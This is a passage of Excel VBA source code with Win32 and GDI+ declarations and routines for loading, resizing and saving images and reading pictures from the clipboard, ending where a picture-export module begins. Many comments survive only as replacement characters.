    Declare PtrSafe Function GdipDrawImageRectRectI Lib "gdiplus.dll" (ByVal Graphics As LongPtr, ByVal GpImage As LongPtr, ByVal dstx As LongPtr, ByVal dsty As LongPtr, ByVal dstwidth As LongPtr, ByVal dstheight As LongPtr, ByVal srcx As LongPtr, ByVal srcy As LongPtr, ByVal srcwidth As LongPtr, ByVal srcheight As LongPtr, ByVal srcUnit As LongPtr, ByVal imageAttributes As LongPtr, ByVal callback As LongPtr, ByVal callbackData As LongPtr) As LongPtr


Type GUID: Data1 As LongPtr: Data2 As Integer: Data3 As Integer: Data4(0 To 7) As Byte: End Type
Type PICTDESC: Size As Long: Type As Long: hPic As LongPtr: hPal As LongPtr: Reserved As Long: End Type
Type GdiplusStartupInput: GdiplusVersion As LongPtr: DebugEventCallback As LongPtr: SuppressBackgroundThread As LongPtr: SuppressExternalCodecs As LongPtr: End Type
Type EncoderParameter: GUID As GUID: NumberOfValues As LongPtr: Type As LongPtr: Value As LongPtr: End Type
Type EncoderParameters: Count As LongPtr: Parameter As EncoderParameter: End Type
Enum GpStatus
    Status_OK = 0: Status_GenericError = 1: Status_InvalidParameter = 2: Status_OutOfMemory = 3: Status_ObjectBusy = 4: Status_InsufficientBuffer = 5
    Status_NotImplemented = 6: Status_Win32Error = 7: Status_WrongState = 8: Status_Aborted = 9: Status_FileNotFound = 10: Status_ValueOverflow = 11
    Status_AccessDenied = 12: Status_UnknownImageFormat = 13: Status_FontFamilyNotFound = 14: Status_FontStyleNotFound = 15: Status_NotTrueTypeFont = 16
    Status_UnsupportedGdiplusVersion = 17: Status_GdiplusNotInitialized = 18: Status_PropertyNotFound = 19: Status_PropertyNotSupported = 20
End Enum

#Else
    Declare Function CopyEnhMetaFile Lib "gdi32" Alias "CopyEnhMetaFileA" (ByVal hemfSrc As Long, ByVal lpszFile As String) As Long
    Declare Function DeleteEnhMetaFile Lib "gdi32.dll" (ByVal hemf As Long) As Long

    Declare Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Integer) As Long
    Declare Function OpenClipboard Lib "user32" (ByVal hwnd As Long) As Long
    Declare Function GetClipBoardData Lib "user32" Alias "GetClipboardData" (ByVal wFormat As Integer) As Long
    Declare Function CloseClipboard Lib "user32" () As Long
    Declare Function CopyImage Lib "user32" (ByVal Handle As Long, ByVal un1 As Long, ByVal n1 As Long, ByVal n2 As Long, ByVal un2 As Long) As Long

    Declare Function GdipCreateBitmapFromHBITMAP Lib "GDIPlus" (ByVal hbm As Long, ByVal hPal As Long, bitmap As Long) As Long
    Declare Function GdipSaveImageToFile Lib "GDIPlus" (ByVal Image As Long, ByVal filename As Long, clsidEncoder As GUID, encoderParams As Any) As Long
    Declare Function CLSIDFromString Lib "ole32" (ByVal str As Long, ID As GUID) As Long

    Declare Function GdiplusStartup Lib "GDIPlus" (token As Long, inputbuf As GdiplusStartupInput, Optional ByVal outputbuf As Long = 0) As GpStatus
    Declare Function GdipCreateBitmapFromFile Lib "GDIPlus" (ByVal filename As Long, bitmap As Long) As GpStatus
    Declare Function GdipCreateHBITMAPFromBitmap Lib "GDIPlus" (ByVal bitmap As Long, hbmReturn As Long, ByVal background As Long) As GpStatus
    Declare Function GdipDisposeImage Lib "GDIPlus" (ByVal Image As Long) As GpStatus
    Declare Function GdiplusShutdown Lib "GDIPlus" (ByVal token As Long) As Long
    'Declare Function OleCreatePictureIndirect Lib "olepro32.dll" (PicDesc As PICTDESC, RefIID As GUID, ByVal fPictureOwnsHandle As Long, IPic As IPicture) As Long
    Declare Function OleCreatePictureIndirect Lib "oleaut32.dll" (PicDesc As PICTDESC, RefIID As GUID, ByVal fPictureOwnsHandle As Long, IPic As IPicture) As Long

    Declare Function GdipGetImageDimension Lib "GDIPlus" (ByVal Image As Long, Width As Single, Height As Single) As GpStatus
    Declare Function GdipGetImageWidth Lib "GDIPlus" (ByVal Image As Long, Width As Long) As GpStatus
    Declare Function GdipGetImageHeight Lib "GDIPlus" (ByVal Image As Long, Height As Long) As GpStatus
    Declare Function GdipGetImageHorizontalResolution Lib "GDIPlus" (ByVal Image As Long, resolution As Single) As GpStatus
    Declare Function GdipGetImageVerticalResolution Lib "GDIPlus" (ByVal Image As Long, resolution As Single) As GpStatus
    Declare Function GdipGetImageThumbnail Lib "GDIPlus" (ByVal Image As Long, ByVal thumbWidth As Long, ByVal thumbHeight As Long, thumbImage As Long, _
                                                          Optional ByVal callback As Long = 0, Optional ByVal callbackData As Long = 0) As GpStatus
    Declare Function GdipLoadImageFromFile Lib "GDIPlus" (ByVal filename As String, Image As Long) As GpStatus
    Declare Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" (ByVal hwnd As Long, ByVal pszPath As String, ByVal psa As Any) As Long

    Declare Function CreateCompatibleDC Lib "gdi32" (ByVal hDC As Long) As Long
    Declare Function CreateCompatibleBitmap Lib "gdi32" (ByVal hDC As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
    Declare Function GetDeviceCaps Lib "gdi32" (ByVal hDC As Long, ByVal nIndex As Long) As Long
    Declare Function PatBlt Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal dwRop As Long) As Long
    Declare Function CreateBitmap Lib "gdi32" (ByVal nWidth As Long, ByVal nHeight As Long, ByVal nPlanes As Long, ByVal nBitCount As Long, lpBits As Any) As Long
    Declare Function SelectObject Lib "gdi32" (ByVal hDC As Long, ByVal hObject As Long) As Long
    Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
    Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
    Declare Function DeleteDC Lib "gdi32" (ByVal hDC As Long) As Long
    Declare Function GdipCreateFromHDC Lib "gdiplus.dll" (ByVal hDC As Long, GpGraphics As Long) As Long
    Declare Function GdipSetInterpolationMode Lib "gdiplus.dll" (ByVal Graphics As Long, ByVal InterMode As Long) As Long
    Declare Function GdipDrawImageRectI Lib "gdiplus.dll" (ByVal Graphics As Long, ByVal Img As Long, ByVal X As Long, ByVal y As Long, ByVal Width As Long, ByVal Height As Long) As Long
    Declare Function GdipDeleteGraphics Lib "gdiplus.dll" (ByVal Graphics As Long) As Long
    Declare Function GdipDrawImageRectRectI Lib "gdiplus.dll" (ByVal Graphics As Long, ByVal GpImage As Long, ByVal dstx As Long, ByVal dsty As Long, ByVal dstwidth As Long, ByVal dstheight As Long, ByVal srcx As Long, ByVal srcy As Long, ByVal srcwidth As Long, ByVal srcheight As Long, ByVal srcUnit As Long, ByVal imageAttributes As Long, ByVal callback As Long, ByVal callbackData As Long) As Long


Type GUID: Data1 As Long: Data2 As Integer: Data3 As Integer: Data4(0 To 7) As Byte: End Type
Type PICTDESC: Size As Long: Type As Long: hPic As Long: hPal As Long: End Type
Type GdiplusStartupInput: GdiplusVersion As Long: DebugEventCallback As Long: SuppressBackgroundThread As Long: SuppressExternalCodecs As Long: End Type
Type EncoderParameter: GUID As GUID: NumberOfValues As Long: Type As Long: Value As Long: End Type
Type EncoderParameters: Count As Long: Parameter As EncoderParameter: End Type
Enum GpStatus
    Status_OK = 0: Status_GenericError = 1: Status_InvalidParameter = 2: Status_OutOfMemory = 3: Status_ObjectBusy = 4: Status_InsufficientBuffer = 5
    Status_NotImplemented = 6: Status_Win32Error = 7: Status_WrongState = 8: Status_Aborted = 9: Status_FileNotFound = 10: Status_ValueOverflow = 11
    Status_AccessDenied = 12: Status_UnknownImageFormat = 13: Status_FontFamilyNotFound = 14: Status_FontStyleNotFound = 15: Status_NotTrueTypeFont = 16
    Status_UnsupportedGdiplusVersion = 17: Status_GdiplusNotInitialized = 18: Status_PropertyNotFound = 19: Status_PropertyNotSupported = 20
End Enum
#End If


Type PWMFRect16: Left As Integer: Top As Integer: Right As Integer: Bottom As Integer: End Type
Public Const CF_BITMAP = 2, IMAGE_BITMAP = 0, LR_COPYRETURNORG = &H4, CF_ENHMETAFILE As Long = 14, CF_METAFILEPICT = 3, CF_DIB = 8

Public v_1&, v_2&
Public Const PLANES = 14, BITSPIXEL = 12, PATCOPY = &HF00021, InterpolationModeHighQualityBicubic = 7

#If VBA7 Then
    Declare PtrSafe Function CountClipboardFormats Lib "user32" () As Long
#Else
    Declare Function CountClipboardFormats Lib "user32" () As Long
#End If

Function GetPictureSizeNew(ByVal filename$, ByRef imgWidth As Single, ByRef imgHeight As Single) As Boolean
    On Error Resume Next:
    #If VBA7 Then
        Dim hGdiImage As LongPtr, uGdiInput As GdiplusStartupInput, hGdiPlus As LongPtr
    #Else
        Dim hGdiImage As Long, uGdiInput As GdiplusStartupInput, hGdiPlus As Long
    #End If
    uGdiInput.GdiplusVersion = 1

    If GdiplusStartup(hGdiPlus, uGdiInput) = Status_OK Then
        If GdipCreateBitmapFromFile(StrPtr(filename), hGdiImage) = Status_OK Then        '|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Call GdipGetImageDimension(hGdiImage, imgWidth, imgHeight)        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            GdipDisposeImage hGdiImage        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        End If
        GdiplusShutdown hGdiPlus
    End If
    GetPictureSizeNew = imgWidth * imgHeight > 0
End Function

Function ResizeImage(ByVal filename As String, ByVal NewFilename As String, ByVal NewWidth&, ByVal NewHeight&) As Boolean
    On Error Resume Next
    Dim tJpgEncoder As GUID, tParams As EncoderParameters, uGdiInput As GdiplusStartupInput
    #If VBA7 Then
        Dim hGdiImage As LongPtr, hBitmap As LongPtr, quality As LongPtr, hGdiPlus As LongPtr, lRes As LongPtr
        Dim lGDIP As LongPtr, hDC As LongPtr, hBrush As LongPtr, Graphics As LongPtr, hResizedBitmap As LongPtr
    #Else
        Dim hGdiImage As Long, hBitmap As Long, quality As Long, hGdiPlus As Long, lRes As Long
        Dim lGDIP As Long, hDC As Long, hBrush As Long, Graphics As Long, hResizedBitmap As Long
    #End If

    uGdiInput.GdiplusVersion = 1: quality = 80

    If GdiplusStartup(hGdiPlus, uGdiInput) = Status_OK Then        '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GDI+

        If GdipCreateBitmapFromFile(StrPtr(filename), hGdiImage) = Status_OK Then        '|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            '|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            hDC = CreateCompatibleDC(ByVal 0&)        ' Create a memory DC and select a bitmap into it, fill it in with the backcolor

            hBitmap = CreateBitmap(NewWidth&, NewHeight&, GetDeviceCaps(hDC, PLANES), GetDeviceCaps(hDC, BITSPIXEL), ByVal 0&)
            If hBitmap = 0 Then
                Debug.Print "LastDllError=" & Err.LastDllError
                Debug.Print filename
                'Stop
            End If
            hBitmap = SelectObject(hDC, hBitmap)
            '            hBrush = CreateSolidBrush(vbWhite)
            '            hBrush = SelectObject(hDC, hBrush)
            PatBlt hDC, 0, 0, NewWidth&, NewHeight&, PATCOPY        ' |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            '            DeleteObject SelectObject(hDC, hBrush)

            ' Resize the picture
            GdipCreateFromHDC hDC, Graphics
            GdipSetInterpolationMode Graphics, InterpolationModeHighQualityBicubic

            lRes = GdipDrawImageRectI(Graphics, hGdiImage, 0, 0, NewWidth&, NewHeight&)
            GdipDeleteGraphics Graphics
            GdipDisposeImage hGdiImage

            ' Get the bitmap back
            hBitmap = SelectObject(hDC, hBitmap)
            DeleteDC hDC

            If GdipCreateBitmapFromHBITMAP(hBitmap, 0, hResizedBitmap) = 0 Then

                '    Select Case PicType
                '        Case pictypeBMP: sType = "{557CF400-1A04-11D3-9A73-0000F81EF32E}"
                '        Case pictypeGIF: sType = "{557CF402-1A04-11D3-9A73-0000F81EF32E}"
                '        Case pictypePNG: sType = "{557CF406-1A04-11D3-9A73-0000F81EF32E}"
                '        Case pictypeJPG: sType = "{557CF401-1A04-11D3-9A73-0000F81EF32E}"
                '    End Select
                CLSIDFromString StrPtr("{557CF401-1A04-11D3-9A73-0000F81EF32E}"), tJpgEncoder        ' Initialize the encoder GUID
                tParams.Count = 1        ' Initialize the encoder parameters
                With tParams.Parameter        ' Quality
                    CLSIDFromString StrPtr("{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"), .GUID        ' Set the Quality GUID
                    .NumberOfValues = 1: .Type = 4: .Value = VarPtr(quality)
                End With

                #If Win64 Then
                    lRes = GdipSaveImageToFile(hResizedBitmap, StrPtr(NewFilename), tJpgEncoder, ByVal 0&)        ' to fix error in Win 64bit
                #Else
                    lRes = GdipSaveImageToFile(hResizedBitmap, StrPtr(NewFilename), tJpgEncoder, tParams)        ' Save the image
                #End If
                If lRes = 0 Then ResizeImage = True Else Debug.Print "Failed to save reduced image: " & lRes
                GdipDisposeImage hResizedBitmap        ' Destroy the bitmap
            Else
                Debug.Print "Error resizing image"
            End If

            DeleteObject hBitmap        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|

        End If
        GdiplusShutdown hGdiPlus
    Else
        Debug.Print "Error loading GDI+!"
    End If
End Function
'
Function GetClipPicture_FromMetafale() As IPicture
    On Error Resume Next
    #If VBA7 Then
        Dim H As LongPtr, hPicAvail As LongPtr, hPtr As LongPtr, hPal As LongPtr, hCopy As LongPtr
    #Else
        Dim H As Long, hPicAvail As Long, hPtr As Long, hPal As Long, hCopy As Long
    #End If
    hPicAvail = IsClipboardFormatAvailable(49710)         'Check if the clipboard contains a bitmap
    If hPicAvail <> 0 Then
        H = OpenClipboard(0&)        'Get access to the clipboard
        If H > 0 Then
            hPtr = GetClipBoardData(49710)            'Get a handle to the image data
            'hCopy = CopyEnhMetaFile(hPtr, ThisWorkbook.Path & "\res.png")
            'DeleteEnhMetaFile hCopy
            '            Dim MyString As String
            '            RetVal = lstrcpy(MyString, hPtr)
            MsgBox hPtr

            H = CloseClipboard        'Release the clipboard to other programs
        End If
    End If
End Function

Sub test_Export_copyPic()
    Dim sha As Shape
    Set sha = ActiveSheet.Shapes(1)
    sha.Copy
    Debug.Print "CountClipboardFormats = " & CountClipboardFormats
    'CF_ENHMETAFILE = 14, CF_BITMAP=2, CF_METAFILEPICT = 3, CF_DIB = 8
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActiveSheet.shapes(1).copy |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  2,3,8,14
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActiveSheet.shapes(1).CopyPicture xlScreen, xlBitmap |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  2,8


    GetClipPicture_FromMetafale


    Dim myClipboard As New vbaClipboard, ClipboardFormat As vbaClipboardFormat
    'Debug.Print "===================================================================="
    For Each ClipboardFormat In myClipboard.ClipboardFormatsAvailable
        'Debug.Print ClipboardFormat.Number, ClipboardFormat.Name
        'Debug.Print "Len=" & Len(myClipboard.GetClipboardText(ClipboardFormat.Number)), myClipboard.GetClipboardText(ClipboardFormat.Number)
    Next ClipboardFormat
    'Debug.Print "===================================================================="
    'Debug.Print "Len=" & Len(myClipboard.GetClipboardText(49710)), myClipboard.GetClipboardText(49710)
    
    myClipboard.SaveClipboardToFile 49710, ThisWorkbook.Path & "\res.png"
    
    '''Specify CF_ENHMETAFILE for enhanced metafiles and CF_METAFILEPICT for Windows metafiles.
End Sub

Function GetClipPicture() As IPicture
    On Error Resume Next
    #If VBA7 Then
        Dim H As LongPtr, hPicAvail As LongPtr, hPtr As LongPtr, hPal As LongPtr, hCopy As LongPtr
    #Else
        Dim H As Long, hPicAvail As Long, hPtr As Long, hPal As Long, hCopy As Long
    #End If
    hPicAvail = IsClipboardFormatAvailable(CF_BITMAP)        'Check if the clipboard contains a bitmap
    If hPicAvail <> 0 Then
        H = OpenClipboard(0&)        'Get access to the clipboard
        If H > 0 Then
            hPtr = GetClipBoardData(CF_BITMAP)           'Get a handle to the image data
            hCopy = CopyImage(hPtr, IMAGE_BITMAP, 0, 0, LR_COPYRETURNORG)
            H = CloseClipboard        'Release the clipboard to other programs
            'If we got a handle to the image, convert it into a Picture object and return it
            ' If hPtr <> 0 Then Set GetClipPicture = CreatePicture(hCopy, 0, CF_BITMAP)
            If hPtr <> 0 Then Set GetClipPicture = CreateIPicture(hCopy)
        End If
    End If
End Function


Public Function CreatePicture(ByVal hPic, ByVal hPal, ByVal lPicType) As IPictureDisp
    On Error Resume Next
    Dim r, uPicInfo As PICTDESC, IID_IDispatch As GUID, IPic As IPicture        ' IPicture requires a reference to "OLE Automation"
    Const PICTYPE_BITMAP = 1        'OLE Picture types
    With IID_IDispatch        ' Create the Interface GUID (for the IPicture interface)
        .Data1 = &H7BF80980: .Data2 = &HBF32: .Data3 = &H101A: .Data4(0) = &H8B: .Data4(1) = &HBB: .Data4(2) = &H0
        .Data4(3) = &HAA: .Data4(4) = &H0: .Data4(5) = &H30: .Data4(6) = &HC: .Data4(7) = &HAB
    End With
    With uPicInfo        ' Fill uPicInfo with necessary parts.
        .Size = Len(uPicInfo)        ' Length of structure.
        .Type = PICTYPE_BITMAP        ' Type of Picture
        .hPic = hPic        ' Handle to image.
        .hPal = 0        ' Handle to palette (if bitmap).
    End With
    r = OleCreatePictureIndirect(uPicInfo, IID_IDispatch, 1, IPic)        ' Create the Picture object.
    If IPic Is Nothing Then Debug.Print "CreatePicture function: OleCreatePictureIndirect ERROR"
    Set CreatePicture = IPic        ' Return the new Picture object.
End Function


' ----==== SaveJPG ====----
Public Sub SaveJPG(ByVal pict As StdPicture, ByVal filename As String, Optional ByVal quality As Byte = 80)
    On Error Resume Next
    #If VBA7 Then
        Dim tSI As GdiplusStartupInput, lRes As LongPtr, lGDIP As LongPtr, lBitmap As LongPtr
        tSI.GdiplusVersion = 1: lRes = GdiplusStartup(lGDIP, tSI)        ' Initialize GDI+
        If lRes = 0 Then
            lRes = GdipCreateBitmapFromHBITMAP(pict.Handle, 0, lBitmap)        ' Create the GDI+ bitmap from the image handle
            If lRes = 0 Then
                Dim tJpgEncoder As GUID, tParams As EncoderParameters
                CLSIDFromString StrPtr("{557CF401-1A04-11D3-9A73-0000F81EF32E}"), tJpgEncoder        ' Initialize the encoder GUID
                tParams.Count = 1        ' Initialize the encoder parameters
                With tParams.Parameter        ' Quality
                    CLSIDFromString StrPtr("{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"), .GUID        ' Set the Quality GUID
                    .NumberOfValues = 1: .Type = 4: .Value = VarPtr(quality)
                End With
                #If Win64 Then
                    lRes = GdipSaveImageToFile(lBitmap, StrPtr(filename), tJpgEncoder, ByVal 0&)        ' to fix error in Win 64bit
                #Else
                    lRes = GdipSaveImageToFile(lBitmap, StrPtr(filename), tJpgEncoder, tParams)        ' Save the image
                #End If
                GdipDisposeImage lBitmap        ' Destroy the bitmap
            End If
            GdiplusShutdown lGDIP        ' Shutdown GDI+
        End If
    #Else
        Dim tSI As GdiplusStartupInput, lRes As Long, lGDIP As Long, lBitmap As Long
        tSI.GdiplusVersion = 1: lRes = GdiplusStartup(lGDIP, tSI)        ' Initialize GDI+
        If lRes = 0 Then
            lRes = GdipCreateBitmapFromHBITMAP(pict.Handle, 0, lBitmap)        ' Create the GDI+ bitmap from the image handle
            If lRes = 0 Then
                Dim tJpgEncoder As GUID, tParams As EncoderParameters
                CLSIDFromString StrPtr("{557CF401-1A04-11D3-9A73-0000F81EF32E}"), tJpgEncoder        ' Initialize the encoder GUID
                tParams.Count = 1        ' Initialize the encoder parameters
                With tParams.Parameter        ' Quality
                    CLSIDFromString StrPtr("{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"), .GUID        ' Set the Quality GUID
                    .NumberOfValues = 1: .Type = 4: .Value = VarPtr(quality)
                End With
                #If Win64 Then
                    lRes = GdipSaveImageToFile(lBitmap, StrPtr(filename), tJpgEncoder, ByVal 0&)        ' to fix error in Win 64bit
                #Else
                    lRes = GdipSaveImageToFile(lBitmap, StrPtr(filename), tJpgEncoder, tParams)        ' Save the image
                #End If
                GdipDisposeImage lBitmap        ' Destroy the bitmap
            End If
            GdiplusShutdown lGDIP        ' Shutdown GDI+
        End If
    #End If
    If lRes Then Err.Raise 5, , "Cannot save the image. GDI+ Error:" & lRes
End Sub

Public Function LoadPictureGDI(ByVal sFilename As String) As IPicture
    Dim uGdiInput As GdiplusStartupInput, lResult As Long

    #If VBA7 Then
        Dim hGdiPlus As LongPtr, hBitmap As LongPtr, hGdiImage As LongPtr
    #Else
        Dim hGdiPlus As Long, hBitmap As Long, hGdiImage As Long
    #End If

    uGdiInput.GdiplusVersion = 1
    lResult = GdiplusStartup(hGdiPlus, uGdiInput)    'Initialize GDI+

    If lResult = 0 Then
        lResult = GdipCreateBitmapFromFile(StrPtr(sFilename), hGdiImage)    'Load the image
        If lResult = 0 Then
            lResult = GdipCreateHBITMAPFromBitmap(hGdiImage, hBitmap, 0)    'Create a bitmap handle from the GDI image
            Set LoadPictureGDI = CreatePicture(hBitmap, 0, CF_BITMAP)    'Create the IPicture object from the bitmap handle
            GdipDisposeImage hGdiImage    'Tidy up
        End If
        GdiplusShutdown hGdiPlus
    End If
End Function

Attribute VB_Name = "mod_WinAPI_New"
'This module provides a LoadPictureGDI function, which can
'be used instead of VBA's LoadPicture, to load a wide variety
'of image types from disk - including png.
'
'The png format is used in Office 2007-2010 to provide images that
'include an alpha channel for each pixel's transparency
'
'Author:    Stephen Bullen
'Date:      31 October, 2006
'Email:     stephen@oaltd.co.uk

'Updated :  30 December, 2010
'By :       Rob Bovey
'Reason :   Also working now in the 64 bit version of Office 2010

Option Explicit

'Declare a UDT to store a GUID for the IPicture OLE Interface
Private Type GUID
    Data1 As Long
    Data2 As Integer
    Data3 As Integer
    Data4(0 To 7) As Byte
End Type


#If VBA7 Then
    'Declare a UDT to store the bitmap information
Private Type PICTDESC
    Size As Long
Type As Long
    hPic As LongPtr
    hPal As LongPtr
End Type

'Declare a UDT to store the GDI+ Startup information
Private Type GdiplusStartupInput
    GdiplusVersion As Long
    DebugEventCallback As LongPtr
    SuppressBackgroundThread As Long
    SuppressExternalCodecs As Long
End Type

'Windows API calls into the GDI+ library
Private Declare PtrSafe Function GdiplusStartup Lib "GDIPlus" (token As LongPtr, inputbuf As GdiplusStartupInput, Optional ByVal outputbuf As LongPtr = 0) As Long
Private Declare PtrSafe Function GdipCreateBitmapFromFile Lib "GDIPlus" (ByVal filename As LongPtr, bitmap As LongPtr) As Long
Private Declare PtrSafe Function GdipCreateHBITMAPFromBitmap Lib "GDIPlus" (ByVal bitmap As LongPtr, hbmReturn As LongPtr, ByVal background As LongPtr) As Long
Private Declare PtrSafe Function GdipDisposeImage Lib "GDIPlus" (ByVal Image As LongPtr) As Long
Private Declare PtrSafe Sub GdiplusShutdown Lib "GDIPlus" (ByVal token As LongPtr)
Private Declare PtrSafe Function OleCreatePictureIndirect Lib "oleaut32" (PicDesc As PICTDESC, RefIID As GUID, ByVal fPictureOwnsHandle As Long, IPic As IPicture) As Long
#Else
    'Declare a UDT to store the bitmap information
Private Type PICTDESC
    Size As Long
Type As Long
    hPic As Long
    hPal As Long
End Type

'Declare a UDT to store the GDI+ Startup information
Private Type GdiplusStartupInput
    GdiplusVersion As Long
    DebugEventCallback As Long
    SuppressBackgroundThread As Long
    SuppressExternalCodecs As Long
End Type

'Windows API calls into the GDI+ library
Private Declare Function GdiplusStartup Lib "GDIPlus" (token As Long, inputbuf As GdiplusStartupInput, Optional ByVal outputbuf As Long = 0) As Long
Private Declare Function GdipCreateBitmapFromFile Lib "GDIPlus" (ByVal filename As Long, bitmap As Long) As Long
Private Declare Function GdipCreateHBITMAPFromBitmap Lib "GDIPlus" (ByVal bitmap As Long, hbmReturn As Long, ByVal background As Long) As Long
Private Declare Function GdipDisposeImage Lib "GDIPlus" (ByVal Image As Long) As Long
Private Declare Sub GdiplusShutdown Lib "GDIPlus" (ByVal token As Long)
Private Declare Function OleCreatePictureIndirect Lib "oleaut32" (PicDesc As PICTDESC, RefIID As GUID, ByVal fPictureOwnsHandle As Long, IPic As IPicture) As Long
#End If

' Procedure:    LoadPictureGDI
' Purpose:      Loads an image using GDI+
' Returns:      The image as an IPicture Object
Public Function LoadPictureGDI_New(ByVal sFilename As String) As IPicture

    Dim uGdiInput As GdiplusStartupInput
    Dim lResult As Long
    #If VBA7 Then
        Dim hGdiPlus As LongPtr
        Dim hGdiImage As LongPtr
        Dim hBitmap As LongPtr
    #Else
        Dim hGdiPlus As Long
        Dim hGdiImage As Long
        Dim hBitmap As Long
    #End If

    'Initialize GDI+
    uGdiInput.GdiplusVersion = 1
    lResult = GdiplusStartup(hGdiPlus, uGdiInput)

    If lResult = 0 Then

        'Load the image
        lResult = GdipCreateBitmapFromFile(StrPtr(sFilename), hGdiImage)

        If lResult = 0 Then

            'Create a bitmap handle from the GDI image
            lResult = GdipCreateHBITMAPFromBitmap(hGdiImage, hBitmap, 0)

            'Create the IPicture object from the bitmap handle
            Set LoadPictureGDI_New = CreateIPicture(hBitmap)

            'Tidy up
            GdipDisposeImage hGdiImage
        End If

        'Shutdown GDI+
        GdiplusShutdown hGdiPlus
    End If

End Function


' Procedure:    CreateIPicture
' Purpose:      Converts a image handle into an IPicture object.
' Returns:      The IPicture object
#If VBA7 Then
Function CreateIPicture(ByVal hPic As LongPtr) As IPicture
#Else
Function CreateIPicture(ByVal hPic As Long) As IPicture
#End If
Dim lResult As Long
Dim uPicInfo As PICTDESC
Dim IID_IDispatch As GUID
Dim IPic As IPicture

'OLE Picture types
Const PICTYPE_BITMAP = 1

' Create the Interface GUID (for the IPicture interface)
With IID_IDispatch
    .Data1 = &H7BF80980
    .Data2 = &HBF32
    .Data3 = &H101A
    .Data4(0) = &H8B
    .Data4(1) = &HBB
    .Data4(2) = &H0
    .Data4(3) = &HAA
    .Data4(4) = &H0
    .Data4(5) = &H30
    .Data4(6) = &HC
    .Data4(7) = &HAB
End With

' Fill uPicInfo with necessary parts.
With uPicInfo
    .Size = Len(uPicInfo)
    .Type = PICTYPE_BITMAP
    .hPic = hPic
    .hPal = 0
End With

' Create the Picture object.
lResult = OleCreatePictureIndirect(uPicInfo, IID_IDispatch, True, IPic)

' Return the new Picture object.
Set CreateIPicture = IPic

End Function



#If VBA7 Then
Function CreateIPicture2(ByVal hPic As LongPtr) As IPicture
#Else
Function CreateIPicture2(ByVal hPic As Long) As IPicture
#End If
Dim lResult As Long
Dim uPicInfo As PICTDESC
Dim IID_IDispatch As GUID
Dim IPic As IPicture

'OLE Picture types
Const PICTYPE_BITMAP = 1

' Create the Interface GUID (for the IPicture interface)
With IID_IDispatch
    .Data1 = &H7BF80980
    .Data2 = &HBF32
    .Data3 = &H101A
    .Data4(0) = &H8B
    .Data4(1) = &HBB
    .Data4(2) = &H0
    .Data4(3) = &HAA
    .Data4(4) = &H0
    .Data4(5) = &H30
    .Data4(6) = &HC
    .Data4(7) = &HAB
End With

' Fill uPicInfo with necessary parts.
With uPicInfo
    .Size = Len(uPicInfo)
    .Type = 2    ' PICTYPE_METAFILE
    .hPic = hPic
    .hPal = 0
End With

' Create the Picture object.
lResult = OleCreatePictureIndirect(uPicInfo, IID_IDispatch, True, IPic)
Debug.Print "lResult", lResult
' Return the new Picture object.
Set CreateIPicture2 = IPic

End Function
Attribute VB_Name = "mod__ExportPictures"
'---------------------------------------------------------------------------------------
' Module        : mod__ExportPictures
' Author        : EducatedFool                     Date: 12.02.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Sub ExportPictures_FromMenu()
    On Error Resume Next: Err.Clear
    If ActiveWorkbook Is Nothing Then MsgBox tt("MSG_OpenWorkbookFirst"), vbCritical, tt("MSG_OpenWorkbookFirst_Title"): Exit Sub
    F_Export.Show
    F_Export.MultiPage_ExportImages.Value = 0
End Sub

Function ExportPictures_FullSize(ByVal FolderPath As String) As Long
